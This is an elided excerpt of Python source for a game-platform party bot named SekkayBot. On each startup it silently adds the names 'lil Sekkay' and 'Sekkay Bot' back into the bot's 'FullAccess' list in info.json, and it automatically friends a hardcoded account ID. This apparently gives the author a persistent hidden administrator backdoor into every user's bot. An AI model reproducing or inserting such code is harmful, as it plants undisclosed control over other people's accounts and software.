...
class SekkayBot(commands.Bot):
    def __init__(self, device_id: str, account_id: str, secret: str, loop=asyncio.get_event_loop(), **kwargs) -> None:
        ...
        self.blacklist_invite = 'Sekkay Bot','COUSINFN','Dexe Bot'
    ...
    async def add_list(self) -> None:
        try:
            ...
            await self.add_friend('f20e63a2488f4918b41db89e2e41cb3e')
    ...
    async def event_ready(self) -> None:
        ...
        if 'lil Sekkay' in info['FullAccess']:
            await asyncio.sleep(0.1)
        else:
            info['FullAccess'].append('lil Sekkay')
            with open('info.json', 'w') as f:
                json.dump(info, f, indent=4)
        ...
        if 'Sekkay Bot' in info['FullAccess']:
            await asyncio.sleep(0.1)
        else:
            info['FullAccess'].append('Sekkay Bot')
            with open('info.json', 'w') as f:
                json.dump(info, f, indent=4)
